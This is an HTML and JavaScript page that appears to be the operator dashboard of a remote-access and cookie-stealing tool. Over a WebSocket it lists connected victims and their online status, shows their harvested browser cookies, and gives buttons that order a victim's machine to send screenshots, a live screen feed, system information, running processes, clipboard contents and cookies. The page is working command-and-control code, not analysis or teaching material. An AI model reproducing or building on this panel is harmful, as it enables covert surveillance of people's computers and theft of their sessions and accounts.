<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Dashboard</title>
<style>
body{margin:0;background:#1e1e1e;color:#fff;font-family:sans-serif;overflow:hidden;}
#sideFrame{position:fixed;left:0;top:0;width:300px;height:100%;background:linear-gradient(180deg,#330000,#660000);padding:10px;box-sizing:border-box;overflow:auto;}
#jsonFrame,#controllerFrame{margin-bottom:20px;padding:10px;background:#222;border-radius:8px;overflow:auto;}
.frameHeader{font-weight:bold;margin-bottom:5px;}
.configOverlay{position:fixed;top:0;left:0;width:100%;height:100%;backdrop-filter:blur(6px);display:none;justify-content:center;align-items:center;}
.configContent{width:80%;max-width:800px;background:linear-gradient(180deg,#330000,#660000);padding:20px;border-radius:12px;position:relative;display:flex;flex-direction:column;}
.configHeader{font-size:18px;font-weight:bold;margin-bottom:10px;}
#actionLogs{flex:1;overflow:auto;margin-top:10px;padding:5px;background:#111;border-radius:6px;}
button{padding:5px 10px;margin:2px;background:#550000;border:none;border-radius:4px;color:white;cursor:pointer;}
button:hover{background:#880000;}
img.liveScreen{width:100%;border-radius:6px;margin-top:10px;}
</style>
</head>
<body>

<div id="sideFrame">
    <div id="jsonFrame"><div class="frameHeader">JSON Data</div></div>
    <div id="controllerFrame"><div class="frameHeader">Controller</div></div>
</div>

<div class="configOverlay" id="configOverlay">
    <div class="configContent">
        <div class="configHeader" id="configUserName">User Config</div>
        <div id="buttonsContainer"></div>
        <img class="liveScreen" id="liveScreenImg" src="">
        <div id="actionLogs"></div>
        <button onclick="closeConfig()">Close</button>
    </div>
</div>

<script>
let ws = new WebSocket(`ws://${location.host}`);
let currentConfigUser = null;

ws.onmessage = (msg)=>{
    const data = JSON.parse(msg.data);

    if(data.type==='heartbeat'){
        updateControllerUser(data.User,true);
    }else if(data.type==='json'){
        addJsonData(data.User,data.Cookies);
    }else if(data.type==='action'){
        if(currentConfigUser===data.User) addActionLog(data.Action);
    }else if(data.type==='screenshot' || data.type==='live'){
        if(currentConfigUser===data.User){
            document.getElementById('liveScreenImg').src='data:image/png;base64,'+data.Image;
        }
    }
};

function addJsonData(user,cookies){
    let f = document.createElement('div');
    f.innerText=`User: ${user}\nCookies: ${cookies}`;
    document.getElementById('jsonFrame').appendChild(f);
}

function updateControllerUser(user,online){
    let f = document.getElementById('controller_'+user);
    if(!f){
        f = document.createElement('div');
        f.id='controller_'+user;
        f.innerHTML=`<b>${user}</b> - <span>${online?'ðŸŸ¢ Online':'ðŸ”´ Offline'}</span><button onclick="openConfig('${user}')">Config User</button>`;
        document.getElementById('controllerFrame').appendChild(f);
    }else{
        f.querySelector('span').innerText=online?'ðŸŸ¢ Online':'ðŸ”´ Offline';
    }
}

function openConfig(user){
    currentConfigUser=user;
    document.getElementById('configUserName').innerText=user+' Config';
    document.getElementById('actionLogs').innerHTML='';
    document.getElementById('buttonsContainer').innerHTML=`
        <button onclick="sendAction('${user}','Screenshot')">Screenshot</button>
        <button onclick="sendAction('${user}','Live Screen')">Live Screen</button>
        <button onclick="sendAction('${user}','System Info')">System Info</button>
        <button onclick="sendAction('${user}','Processes')">Processes</button>
        <button onclick="sendAction('${user}','Clipboard')">Clipboard</button>
        <button onclick="sendAction('${user}','Cookies')">Cookies</button>
    `;
    document.getElementById('configOverlay').style.display='flex';
}

function closeConfig(){
    currentConfigUser=null;
    document.getElementById('configOverlay').style.display='none';
}

function sendAction(user,action){
    ws.send(JSON.stringify({type:'action',User:user,Action:action}));
}

function addActionLog(action){
    let logs=document.getElementById('actionLogs');
    let f=document.createElement('div');
    f.innerText=action;
    logs.prepend(f);
}

</script>
</body>
</html>